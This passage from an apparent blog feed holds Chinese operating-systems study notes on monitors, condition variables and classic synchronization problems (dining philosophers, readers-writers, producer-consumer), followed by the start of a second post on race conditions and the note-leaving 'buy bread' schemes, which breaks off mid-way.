<h2 id="管程组成"><a href="#管程组成" class="headerlink" title="管程组成"></a>管程组成</h2><ul>
<li>一个锁<ul>
<li>控制管程代码的互斥访问(入口)</li>
</ul>
</li>
<li>0或者多个条件变量<ul>
<li>管理共享数据的并发访问</li>
</ul>
</li>
<li><strong>局部数据变量只能被管程的过程访问</strong></li>
<li><strong>一个进程通过调用管程的一个过程进入管程</strong></li>
<li> <strong>在任何时候，只能有一个进程在管程中执行</strong> </li>
</ul>
<p><img src="https://i.loli.net/2019/07/29/5d3e47605ec4920590.png"></p>
<h2 id="条件变量"><a href="#条件变量" class="headerlink" title="条件变量"></a>条件变量</h2><p>条件变量为管程内的等待机制</p>
<ul>
<li>进入管程的线程因资源被占用而进入等待状态</li>
<li>每个条件变量表示一种等待原因，对应一个等待队列</li>
<li><code>Wait()</code>操作<ul>
<li>将自己阻塞在等待队列中</li>
<li>唤醒一个等待者或释放管程的互斥访问</li>
</ul>
</li>
<li><code>Signal()</code>操作<ul>
<li>将等待队列中的一个线程唤醒</li>
<li>如果等待队列为空则等同于空操作</li>
</ul>
</li>
</ul>
<h2 id="条件变量实现"><a href="#条件变量实现" class="headerlink" title="条件变量实现"></a>条件变量实现</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Class Condition &#123;</span><br><span class="line">    <span class="keyword">int</span> numWaiting = <span class="number">0</span>; <span class="comment">// 等待线程数</span></span><br><span class="line">    WaitQueue q;</span><br><span class="line">&#125;</span><br><span class="line">Condition::Wait(lock)&#123;</span><br><span class="line">    numWaiting++; <span class="comment">// 有线程处于等待状态</span></span><br><span class="line">    Add <span class="keyword">this</span> thread t  to q;</span><br><span class="line">    release(lock); <span class="comment">// 释放管程的访问权</span></span><br><span class="line">    schedule(); <span class="comment">//need mutex，执行调度</span></span><br><span class="line">    require(lock); <span class="comment">// 请求管程访问权</span></span><br><span class="line">&#125;</span><br><span class="line">Condition::Signal()&#123;</span><br><span class="line">    <span class="keyword">if</span> (numWaiting &gt; <span class="number">0</span>) &#123; </span><br><span class="line">    <span class="comment">// 如果等待队列为空，则为空操作</span></span><br><span class="line">        Remove a thread t from q;</span><br><span class="line">        wakeup(t); <span class="comment">//need mutex</span></span><br><span class="line">        numWaiting--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>信号量初值与资源数相同，而条件变量初值为0。</p>
<p>条件变量的实现和信号量类似，但是有些区别，参考<a href="https://pages.mtu.edu/~shene/NSF-3/e-Book/MONITOR/sema-vs-monitor.html">mtu课件</a>，<a href="https://courses.engr.illinois.edu/cs241/sp2012/lectures/25-condition.pdf">cs241</a>,<a href="https://zh.wikipedia.org/wiki/%E7%9B%A3%E8%A6%96%E5%99%A8_%28%E7%A8%8B%E5%BA%8F%E5%90%8C%E6%AD%A5%E5%8C%96%29">wiki</a>，总结如下</p>
<ul>
<li>对管程的互斥锁的释放和获得</li>
<li>signal和V语义的不同：PV操作必须是成对的，但signal/wait操作完全不需要保证这一点</li>
<li>wait和P语义的不同：V操作后线程可能会继续执行，但wait操作后，线程必然进入等待队列并阻塞</li>
<li>执行signal/wait时，都默认已经获得了互斥锁</li>
</ul>
<p>信号量和条件变量是并发问题的两种处理模型。</p>
<p>信号量将并发的问题抽象为有限的资源，用计数器表示，资源足够时往下走，不够时等待。</p>
<p>条件变量则将并发的问题抽象为事件，当满足某种事件的时候，往下走，不满足某种事件的时候暂时放弃锁。</p>
<h2 id="管程语义"><a href="#管程语义" class="headerlink" title="管程语义"></a>管程语义</h2><p>参考<a href="https://www.andrew.cmu.edu/course/15-440-kesden/applications/ln/lecture6.html">cmu课件</a> 和<a href="https://piazza.com/class/i5j09fnsl7k5x0?cid=894">piazza</a>,考虑以下情况：线程A在条件变量的等待队列中等待资源，此时线程B在该条件变量上执行<code>signal()</code>操作，根据处理方式分为：</p>
<ol>
<li>mesa管程</li>
<li>hansen管程</li>
<li>hoare管程</li>
</ol>
<p><strong>mesa管程</strong></p>
<p><img src="https://i.loli.net/2019/11/02/ZuadODiK8nB59c2.png"></p>
<ul>
<li>线程B执行signal之后，不会立刻退出管程，而是执行到lock.release()之后才进入就绪态</li>
<li>线程A会被移动到入口等待队列中</li>
<li>在wait后被唤醒的进程不一定会被立刻调度，因此需要用<code>while</code>来检查条件</li>
<li>大部分实际实现的管程采用的是这一语义</li>
</ul>
<p><strong>hoare管程</strong></p>
<ul>
<li>线程B执行signal之后，迅速唤醒等待中的线程A，自己进入signal队列中（这个队列是此语义特有的）</li>
<li>每次有线程退出时，先到signal队列中调度线程，如果signal队列空，才到入口等待队列调度线程</li>
<li>实际实现中一般不采用，因为需要多一个队列，代价增大了</li>
</ul>
<p><img src="https://i.loli.net/2019/11/02/JyZQrmG4gUEodNz.png"></p>
<p><strong>hansen管程</strong></p>
<p> 线程B退出的同时才执行signal操作 </p>
<p><img src="https://i.loli.net/2019/11/02/OfhW5TxbPKEDmu6.png"></p>
<p>Mesa管程：占用管程的当前进程可在任何时刻释放占用资源并唤醒相应的等待进程，当前进程继续执行，被唤醒放回入口队列队首等待当前进程释放管程访问权；</p>
<p>Hoare管程：占用管程的当前进程可在任何时刻释放占用资源并唤醒相应的等待进程，当前进程进入唤醒队列等待，被唤醒进程继续执行直到释放管程访问权；管程空闲时，优先查看唤醒队列中的等待进程，唤醒队列中没有等待进程时再查看入口队列；</p>
<p>Hansen管程：占用管程的当前进程只在退出管程时释放占用资源并唤醒相应的等待进程，被唤醒进程继续执行直到释放管程访问权；</p>
<p>条件判断中while和if对释放处理中的执行顺序影响：<br>在Hansen和Mesa管程中，由于条件变量释放操作signal时并没有立即放弃管程访问权，资源的可用状态可能变化，需使用while()进行重新检查；<br>在Hoare管程中，由于条件变量释放操作signal同时表示立即放弃管程访问权，资源的可用状态保持不变，可使用if判断，不需要再次检查。</p>
<p>依据目前的理解，Hansen和Mesa管程在程序行为效果上来看，它们是一致的。</p>
<h1 id="哲学家就餐问题"><a href="#哲学家就餐问题" class="headerlink" title="哲学家就餐问题"></a>哲学家就餐问题</h1><p><img src="https://i.loli.net/2019/07/29/5d3e507177ae590470.png"></p>
<blockquote>
<p>方案一</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5 <span class="comment">// 哲学家个数</span></span></span><br><span class="line">semaphore fork[<span class="number">5</span>]; <span class="comment">// 互斥操作，信号量初值为1</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">philosopher</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123; </span><br><span class="line">    <span class="comment">// 哲学家编号：0 － 4</span></span><br><span class="line">    <span class="keyword">while</span> (ture) &#123;</span><br><span class="line">        think();</span><br><span class="line">        P(fork[i]); <span class="comment">// 拿左边的叉子</span></span><br><span class="line">        P(fork[(i + <span class="number">1</span>) % N]); <span class="comment">// 拿右边的叉子</span></span><br><span class="line">        eat();</span><br><span class="line">        V(fork[i]); <span class="comment">// 放下左边的叉子</span></span><br><span class="line">        V(fork[(i + <span class="number">1</span>) % N]); <span class="comment">// 放下右边的叉子</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不正确，有可能5个人同时拿左边叉子，都拿不到右边叉子，形成死锁。</p>
<blockquote>
<p>方案二</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5 <span class="comment">// 哲学家个数</span></span></span><br><span class="line">semaphore fork[<span class="number">5</span>]; <span class="comment">// 信号量初值为1</span></span><br><span class="line">semaphore mutex; <span class="comment">// 互斥信号量，初值1</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">philosopher</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 哲学家编号：0 － 4</span></span></span><br><span class="line"><span class="function">    <span class="title">while</span><span class="params">(TRUE)</span> </span>&#123;</span><br><span class="line">        think();</span><br><span class="line">        P(mutex); <span class="comment">// 进入临界区	 只有一个哲学家能就餐</span></span><br><span class="line"></span><br><span class="line">        P(fork[i]); <span class="comment">// 去拿左边的叉子</span></span><br><span class="line">        P(fork[(i + <span class="number">1</span>) % N]);<span class="comment">// 去拿右边的叉子</span></span><br><span class="line">        eat();	</span><br><span class="line">        V(fork[i]); <span class="comment">// 放下左边的叉子</span></span><br><span class="line">        V(fork[(i + <span class="number">1</span>) % N]); <span class="comment">// 放下右边的叉子</span></span><br><span class="line"></span><br><span class="line">        V(mutex); <span class="comment">// 退出临界区	</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>互斥访问正确，但任何时间只有一个哲学家就餐，叉子可满足两位哲学家同时就餐，性能差。</p>
<blockquote>
<p>方案三</p>
</blockquote>
<ul>
<li>和方案1一样，使用5个信号量表示筷子</li>
<li>哲学家根据编号不同，拿取筷子的顺序不同,从而避免都拿到左边刀叉而等待右边刀叉形成循环等待的情况</li>
<li>此时没有死锁，且允许两个人同时就餐</li>
</ul>
<h2 id="信号量-1"><a href="#信号量-1" class="headerlink" title="信号量"></a>信号量</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5 <span class="comment">// 哲学家个数</span></span></span><br><span class="line">semaphore fork[<span class="number">5</span>]; <span class="comment">// 信号量初值为1</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">philosopher</span><span class="params">(<span class="keyword">int</span> i)</span> <span class="comment">// 哲学家编号：0 － 4</span></span></span><br><span class="line"><span class="function">    <span class="title">while</span><span class="params">(TRUE)</span> </span>&#123;</span><br><span class="line">        think();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123; </span><br><span class="line">            <span class="comment">// 偶数 先拿左 后拿右 奇数 先拿右 后拿左</span></span><br><span class="line">            P(fork[i]); <span class="comment">// 去拿左边的叉子</span></span><br><span class="line">            P(fork[(i + <span class="number">1</span>) % N]); <span class="comment">// 去拿右边的叉子</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            P(fork[(i + <span class="number">1</span>) % N]); <span class="comment">// 去拿右边的叉子</span></span><br><span class="line">            P(fork[i]); <span class="comment">// 去拿左边的叉子 </span></span><br><span class="line">        &#125;</span><br><span class="line">        eat();</span><br><span class="line"></span><br><span class="line">        V(fork[i]); <span class="comment">// 放下左边的叉子</span></span><br><span class="line">        V(fork[(i + <span class="number">1</span>) % N]); <span class="comment">// 放下右边的叉子</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h1 id="读者写者问题"><a href="#读者写者问题" class="headerlink" title="读者写者问题"></a>读者写者问题</h1><p>共享资源的两类使用者</p>
<ul>
<li><strong>读者</strong> 只读取数据，不修改</li>
<li><strong>写者</strong> 读取和修改数据</li>
<li>读读允许<ul>
<li>同一时刻允许有多个读者同时读</li>
</ul>
</li>
<li>读写互斥<ul>
<li>没有写者时，读者才能读</li>
<li>没有读者时，写者才能写</li>
</ul>
</li>
<li>写写互斥<ul>
<li>没有其他写者时，写者才能写</li>
</ul>
</li>
</ul>
<h2 id="信号量-2"><a href="#信号量-2" class="headerlink" title="信号量"></a>信号量</h2><ul>
<li>信号量WriteMutex<ul>
<li>控制读写操作互斥</li>
<li>初始化为 1</li>
</ul>
</li>
<li>读者计数Rcount<ul>
<li>正在进行读操作的读者数目</li>
<li>初始化为 0</li>
</ul>
</li>
<li>信号量CountMutex<ul>
<li>控制对读者计数的互斥修改(保护读者计数)</li>
<li>初始化为 1</li>
</ul>
</li>
</ul>
<p><strong>writer</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P(WriteMutex);</span><br><span class="line">    write();</span><br><span class="line">V(WriteMutex);</span><br></pre></td></tr></table></figure>
<p><strong>reader</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P(CountMutex); &#x2F;&#x2F; 保护 Rcount</span><br><span class="line">if (Rcount &#x3D;&#x3D; 0)</span><br><span class="line">    P(WriteMutex); </span><br><span class="line">&#x2F;&#x2F;若为当前第一个读者，开启读写互斥</span><br><span class="line">++Rcount; </span><br><span class="line">V(CountMutex);</span><br><span class="line">read();</span><br><span class="line">P(CountMutex);</span><br><span class="line">--Rcount;</span><br><span class="line">&#x2F;&#x2F;若为当前最后一个读者，释放互斥访问权限</span><br><span class="line">if (Rcount &#x3D;&#x3D; 0)</span><br><span class="line">    V(WriteMutex); </span><br><span class="line">V(CountMutex);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>读者写者问题的优先策略</p>
</blockquote>
<ul>
<li>读者优先策略<ul>
<li>只要有读者正在读状态，后来的读者都能直接进入</li>
<li>若读者持续不断进入，则写者就处于饥饿</li>
</ul>
</li>
<li>写者优先策略<ul>
<li>只要有写者就绪，写者应尽快执行写操作</li>
<li>若写者持续不断就绪，则读者就处于饥饿</li>
</ul>
</li>
</ul>
<h2 id="管程-1"><a href="#管程-1" class="headerlink" title="管程"></a>管程</h2><p><strong>管程的状态变量</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AR &#x3D; 0; &#x2F;&#x2F; 正在读的读者</span><br><span class="line">AW &#x3D; 0; &#x2F;&#x2F; 正在写的写者</span><br><span class="line">WR &#x3D; 0; &#x2F;&#x2F; 等待读的读者</span><br><span class="line">WW &#x3D; 0; &#x2F;&#x2F; 等待写的写者</span><br><span class="line">Lock lock;</span><br><span class="line">Condition okToRead;</span><br><span class="line">Condition okToWrite;</span><br></pre></td></tr></table></figure>
<p>reader</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Database::Read() &#123;</span><br><span class="line">    <span class="comment">// Wait until no writers;</span></span><br><span class="line">    StartRead(); </span><br><span class="line">    read database;</span><br><span class="line">    <span class="comment">// check out – wake up waiting writers; </span></span><br><span class="line">    DoneRead();</span><br><span class="line">&#125;</span><br><span class="line">Database::StartRead() &#123;</span><br><span class="line">    lock.Acquire();</span><br><span class="line">    <span class="keyword">while</span> ((AW+WW) &gt; <span class="number">0</span>) &#123; </span><br><span class="line">    <span class="comment">//写者优先，只要有写者就等待</span></span><br><span class="line">        WR++;</span><br><span class="line">        okToRead.wait(&amp;lock);</span><br><span class="line">        WR--;</span><br><span class="line">    &#125;</span><br><span class="line">    AR++;</span><br><span class="line">    lock.Release();</span><br><span class="line">&#125;</span><br><span class="line">Database::DoneRead() &#123;</span><br><span class="line">    lock.Acquire();</span><br><span class="line">    AR--;</span><br><span class="line">    <span class="keyword">if</span> (AR == <span class="number">0</span> &amp;&amp; WW &gt; <span class="number">0</span>) &#123; </span><br><span class="line">    <span class="comment">// 当前没有读者并有等待写的写者 则唤醒写者</span></span><br><span class="line">        okToWrite.signal();</span><br><span class="line">    &#125;</span><br><span class="line">    lock.Release();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>writer</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Database::Write() &#123;</span><br><span class="line">    <span class="comment">// Wait until no readers/writers;</span></span><br><span class="line"></span><br><span class="line">    StartWrite(); </span><br><span class="line">    write database;</span><br><span class="line">    <span class="comment">// check out-wake up waiting readers/writers; </span></span><br><span class="line">    DoneWrite(); </span><br><span class="line">&#125;</span><br><span class="line">Database::StartWrite() &#123;</span><br><span class="line">    lock.Acquire();</span><br><span class="line">    <span class="keyword">while</span> ((AW+AR) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//写者优先，有正在写的写着或正在读的读者则等待</span></span><br><span class="line">        WW++;</span><br><span class="line">        okToWrite.wait(&amp;lock);</span><br><span class="line">        WW--;</span><br><span class="line">    &#125;</span><br><span class="line">    AW++;</span><br><span class="line">    lock.Release();</span><br><span class="line">&#125;</span><br><span class="line">Database::DoneWrite() &#123;</span><br><span class="line">    lock.Acquire();</span><br><span class="line">    AW--;</span><br><span class="line">    <span class="keyword">if</span> (WW &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 优先唤醒等待写的写者</span></span><br><span class="line">        okToWrite.signal();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (WR &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果没有等待写的写者 才唤醒等待读的读者</span></span><br><span class="line">        okToRead.broadcast();</span><br><span class="line">    &#125;</span><br><span class="line">    lock.Release();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>while中的判断条件可根据优先策略进行调整，例子采取了写者优先策略。</p>
<p>以上管程在读/写操作时并没有申请互斥信号量，因为在之前申请互斥信号量时将正在/等待读/写的计数等设置完成，此时可确保读写正常进行。</p>
<h1 id="生产者消费者问题"><a href="#生产者消费者问题" class="headerlink" title="生产者消费者问题"></a>生产者消费者问题</h1><p><img src="https://i.loli.net/2019/07/29/5d3e44458b63730406.png"></p>
<h2 id="信号量-3"><a href="#信号量-3" class="headerlink" title="信号量"></a>信号量</h2><p><strong>问题分析</strong></p>
<ul>
<li>任何时刻只能有一个线程操作缓冲区 (互斥访问)</li>
<li>缓冲区空时，消费者必须等待生产者 (条件同步)</li>
<li>缓冲区满时，生产者必须等待消费者 (条件同步)</li>
</ul>
<p><strong>用信号量描述每个约束</strong></p>
<p><img src="https://i.loli.net/2019/11/02/gKpQGk2jhlL9VCw.png"></p>
<ul>
<li><strong>二进制信号量(mutex)</strong> 描述互斥访问</li>
<li><strong>资源信号量(fullBuffers)</strong> 描述缓冲区是否有数据</li>
<li><strong>资源信号量(emptyBuffers)</strong> 描述缓冲区是否有空余区域</li>
</ul>
<p>其中P操作之间的顺序不可颠倒，会引起线程阻塞，V操作不会阻塞，顺序无所谓。</p>
<p><strong>信号量不足</strong></p>
<ul>
<li>读/开发代码比较困难<ul>
<li>程序员需要掌握信号量机制</li>
</ul>
</li>
<li>容易出错<ul>
<li>使用的信号量已被另一个线程占用</li>
<li>PV操作必须成对出现</li>
</ul>
</li>
<li>不能处理死锁问题</li>
</ul>
<blockquote>
<p>为什么在生产者-消费者问题中先申请互斥信号量会导致死锁？</p>
</blockquote>
<p>如果先申请互斥信号量，后申请资源信号量，则在两种情况下可能会出现循环等待：</p>
<ul>
<li>生产者获得互斥信号量后检查<code>emptyBuffers</code>资源信号量，发现缓冲区满了，于是进入睡眠状态；此时消费者无法获得互斥信号量，于是无法消耗缓冲区内的资源</li>
<li>消费者获得互斥信号量后检查<code>fullBuffers</code>资源信号量，发现缓冲区空了，于是进入睡眠状态；此时生产者无法获得互斥信号量，于是无法将资源放入缓冲区内</li>
</ul>
<h2 id="管程-2"><a href="#管程-2" class="headerlink" title="管程"></a>管程</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class BoundedBuffer &#123;</span><br><span class="line">    Lock lock;</span><br><span class="line">    &#x2F;&#x2F; 管程入口的锁</span><br><span class="line">    int count &#x3D; 0;</span><br><span class="line">    &#x2F;&#x2F; 缓冲区数据计数</span><br><span class="line">    Condition notFull, notEmpty;</span><br><span class="line">    &#x2F;&#x2F; 条件变量</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/07/29/5d3e5fa34325a89183.png"></p>
<p>先申请锁再检查条件不存在问题，因为管程不成功时可以放弃互斥访问权限，而信号量则会引起死锁。</p>
<p>管程将PV操作集中到一个模块中，简化和降低同步机制的实现难度。</p>
<h2 id="信号量和管程实现的对比"><a href="#信号量和管程实现的对比" class="headerlink" title="信号量和管程实现的对比"></a>信号量和管程实现的对比</h2><p>信号量中存有<code>int</code>变量<code>sem</code>以及<code>WaitQueue</code>变量<code>q</code>，根据信号量的实现代码，我们可以得出<code>sem</code>和<code>q</code>的含义：</p>
<ul>
<li><code>q</code>代表当前正在等待资源的线程组成的等待队列，若当前资源足够所有进程使用，<code>q</code>为空；</li>
<li><code>sem</code>代表【到目前为止，若所有请求该资源的线程都能够获取该资源，那么资源还剩下多少（这里我们假设资源个数可以为负）】；</li>
<li>对<code>sem</code>也可以有另一种理解：当<code>sem</code>非负时，<code>sem</code>代表剩余资源的个数；当<code>sem</code>为负数时，<code>sem</code>的绝对值代表等待队列<code>q</code>的长度。</li>
</ul>
<p>而当我们使用条件变量解决有限资源问题时，我们通常会在条件变量之外，管程之中加入整型变量<code>count</code>，来帮助条件变量记录当前剩余多少资源（非负）。查看条件变量的实现代码，我们可以得出条件变量中整型变量<code>numWaiting</code>以及<code>WaitQueue</code>变量<code>q</code>的含义：</p>
<ul>
<li><code>q</code>代表当前正在等待资源的线程组成的等待队列，若当前资源足够所有进程使用，<code>q</code>为空；</li>
<li><code>numWaiting</code>代表等待队列<code>q</code>的长度（非负）。</li>
</ul>
<p>结合使用信号量以及条件变量解决有限资源问题的实例，以及以上我们对信号量和条件变量的分析，我们可以得出以下结论：</p>
<ul>
<li>在任一状态，信号量中的<code>q</code>和条件变量中的<code>q</code>完全相同；</li>
<li>当<code>sem</code>非负时，含义与管程中的<code>count</code>相同，此时<code>numWaiting</code>为0；</li>
<li>当<code>sem</code>为负数时，<code>sem</code>的绝对值等于<code>numWaiting</code>，此时<code>count</code>为0。</li>
</ul>
<p>在生产者-消费者这个问题实例中：</p>
<ul>
<li>信号量<code>emptyBuffers</code>与条件变量<code>notFull</code>是匹配的，满足上面3个条件，此时<code>count</code>在代码中以<code>n - count</code>的形式出现；</li>
<li>信号量<code>fullBuffers</code>与条件变量<code>notEmpty</code>是匹配的，满足上面3个条件，此时<code>count</code>在代码中以<code>count</code>的形式出现；</li>
</ul>
<p>综上所述，两种解决方法是完全等价的，至于为什么用管程实现更加安全方便，个人认为老师在视频中并没有解释得很清楚，和老师讨论后得出结论如下：</p>
<ul>
<li>用信号量的时候，所有信号量都要自己维护，并配对好PV；使用条件变量也要根据条件配对好Wait和Signal函数，但是信号量机制允许把PV操作放在任何代码中，而管程只允许把PV操作放在管程内部。</li>
<li>用管程的时候，我们可以理解为<code>BoundedBuffer</code>继承了一个管程类，因此操作系统会给<code>BoundedBuffer</code>中每一个方法自动加上锁（即<code>lock-&gt;Acquire()</code>和<code>lock-&gt;Release()</code>函数并不用自己写，是系统加上的），因此更加安全可控，容易查错。</li>
</ul>
<p>ucore lab7中实现信号量的<code>sem</code>值非负，这样看来ucore中信号量的<code>sem</code>值和条件变量中的<code>count</code>值应该是完全相等的。</p>
<p>同时piazza上另一解释为：</p>
<p>信号量将并发的问题抽象为有限的资源，用计数器表示，资源足够时往下走，不够时等待。</p>
<p>条件变量则将并发的问题抽象为事件，当满足某种事件的时候，往下走，不满足某种事件的时候暂时放弃锁。</p>
<p>生产者消费者问题中，可将条件变量的事件设置为“队列满”、“队列空”，那么就如同信号量那样处理了，所以让人看起来觉得没有区别。 </p>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>Operating Systems</tag>
      </tags>
  </entry>
  <entry>
    <title>同步互斥</title>
    <url>/systems/sync/</url>
    <content><![CDATA[<p> 进程并发执行可提高程序效率，但是并发执行过程是不确定性和不可重现的。在进程间有共享资源，而处理过程并不是整体执行，所以会存在和预期不一致的问题。借助生活中同步问题例子，我们设计了一系列方案并进行改进。</p>
<a id="more"></a>

<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><h2 id="并发进程的正确性"><a href="#并发进程的正确性" class="headerlink" title="并发进程的正确性"></a>并发进程的正确性</h2><blockquote>
<p>程序正确性</p>
</blockquote>
<p>程序执行的结果是实现预期的功能，并且是确定的和可重现的</p>
<p>并发进程执行过程是不确定性和不可重现的，程序错误可能是间歇性发生的</p>
<ul>
<li>独立进程<ul>
<li>不和其他进程共享资源或状态</li>
<li><strong>确定性</strong> 输入状态决定结果</li>
<li><strong>可重现</strong> 能够重现起始条件</li>
<li>调度顺序不重要</li>
</ul>
</li>
<li>并发进程<ul>
<li>在多个进程间有资源共享</li>
<li>不确定性</li>
<li>不可重现</li>
</ul>
</li>
</ul>
<h2 id="进程并发执行的优点"><a href="#进程并发执行的优点" class="headerlink" title="进程并发执行的优点"></a>进程并发执行的优点</h2><p>进程需要与计算机中其他进程或设备进行协作</p>
<p><strong>共享资源</strong> </p>
<ul>
<li>多个用户共用一台计算机</li>
</ul>
<p><strong>加速</strong></p>
<ul>
<li>I/O操作和CPU计算可以并行</li>
<li>程序可划分成多个模块放在多个处理机上并行执行</li>
</ul>
<p><strong>模块化</strong></p>
<ul>
<li>将大程序分解成小程序，使系统易于复用和扩展</li>
</ul>
<h2 id="并发执行的问题"><a href="#并发执行的问题" class="headerlink" title="并发执行的问题"></a>并发执行的问题</h2><p>以并发执行创建新进程时的标识分配为例子，</p>
<p>调用函数<code>fork()</code>来创建一个新的进程（操作系统需要分配一个新的并且唯一的进程ID）</p>
<p>在内核中，这个系统调用会执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new_pid &#x3D; next_pid++</span><br></pre></td></tr></table></figure>
<p>假定<code>next_pid</code>为100</p>
<p><strong>预期结果</strong></p>
<ul>
<li>一个进程ID为100</li>
<li>另一个进程ID为101</li>
<li><code>next_pid</code>应该增加到102</li>
</ul>
<p><strong>实际可能结果</strong></p>
<p><img src="https://i.loli.net/2019/07/28/5d3d900c63a4430295.png"></p>
<p>进程A和进程B的寄存器相互独立，失败原因：二者处理过程并不是整体执行</p>
<h2 id="原子操作-Atomic-Operation"><a href="#原子操作-Atomic-Operation" class="headerlink" title="原子操作(Atomic Operation)"></a>原子操作(Atomic Operation)</h2><p>一次不存在任何中断或失败的操作 </p>
<ul>
<li>要么操作成功完成 </li>
<li>要么操作没有执行</li>
</ul>
<p>不存在部分执行的状态</p>
<p>操作系统需要利用同步机制在并发执行的同时，保证一些操作是原子操作</p>
<h1 id="同步问题"><a href="#同步问题" class="headerlink" title="同步问题"></a>同步问题</h1><h2 id="现实生活中的同步问题"><a href="#现实生活中的同步问题" class="headerlink" title="现实生活中的同步问题"></a>现实生活中的同步问题</h2><table>
<thead>
<tr>
<th>时间</th>
<th>A</th>
<th>B</th>
</tr>
</thead>
<tbody><tr>
<td>3：00</td>
<td>查看冰箱，没有面包了</td>
<td></td>
</tr>
<tr>
<td>3：05</td>
<td>离开家去商店</td>
<td></td>
</tr>
<tr>
<td>3：10</td>
<td>到达商店</td>
<td>查看冰箱，没有面包了</td>
</tr>
<tr>
<td>3：15</td>
<td>购买面包</td>
<td>离开家去商店</td>
</tr>
<tr>
<td>3：20</td>
<td>到家，把面包放进冰箱</td>
<td>到达商店</td>
</tr>
<tr>
<td>3：25</td>
<td></td>
<td>购买面包</td>
</tr>
<tr>
<td>3：30</td>
<td></td>
<td>到家，把面包放进冰箱</td>
</tr>
</tbody></table>
<p><strong>家庭采购问题的分析</strong></p>
<ul>
<li>有人去买面包</li>
<li>最多只有一个人买</li>
</ul>
<p>可能的解决办法：</p>
<ul>
<li>在冰箱上设置一个钥匙</li>
<li>去买面包之前锁住冰箱并且拿走钥匙</li>
</ul>
<p><strong>加锁导致的问题</strong></p>
<p>冰箱中还有其他食物时，别人无法取到</p>
<blockquote>
<p>方案一</p>
</blockquote>
<p>使用便签来避免购买太多面包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(noBread) &#123;</span><br><span class="line">  if(noNote) &#123;</span><br><span class="line">    leave Note;</span><br><span class="line">    buy bread;</span><br><span class="line">    removen Note;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>解决方案只是间歇性的失败</strong></p>
<p>问题难以调试，生活中不会出现(无法察觉他人正在检查便签)</p>
<p>必须考虑调度器所做的事情</p>
<p><img src="https://i.loli.net/2019/07/28/5d3d93271b56569969.png"></p>
<p>进程A和进程B均检测到没有便签，都留下便签然后去买面包</p>
<blockquote>
<p>方案二</p>
</blockquote>
<p>先留便签，后检查面包和便签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leave Note;</span><br><span class="line">if(noBread) &#123;</span><br><span class="line">  if(noNote) &#123;</span><br><span class="line">    buy bread;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">remove bread;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/07/28/5d3d96879981251704.png"></p>
<p>进程A和进程B二者均留下便签，然而谁也不会去买面包</p>
<p>此时需要提及的一点是，方案二单进程运行也买不了面包，在检测标签的时候会检测到自己留下的标签，不会去买面包。</p>
<blockquote>
<p>方案三</p>
</blockquote>
<p>为便签增加标记，以区别不同人的便签，可在检查之前留便签</p>
<p>进程A</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leave note_1;</span><br><span class="line">if (no note_2) &#123;</span><br><span class="line">   if (no bread) &#123; </span><br><span class="line">     buy bread; </span><br><span class="line">   &#125; </span><br><span class="line">&#125; </span><br><span class="line">remove note_1;</span><br></pre></td></tr></table></figure>
<p>进程B</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leave note_2;</span><br><span class="line">if (no note_1) &#123;</span><br><span class="line">   if (no bread) &#123; </span><br><span class="line">     buy bread; </span><br><span class="line">   &#125; </span><br><span class="line">&#125; </span><br><span class="line">remove note_2;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/07/28/5d3d97cd6d88056269.png"></p>
<ul>
<li>二者均不会检查是否有面包，导致没有人去买面包</li>
<li>每个人检测到对方留下的便签以后都认为另外一个去买面包</li>
</ul>
<blockquote>
<p>方案四</p>
</blockquote>
<p>两者采用不同的处理流程</p>
<p>进程A</p>
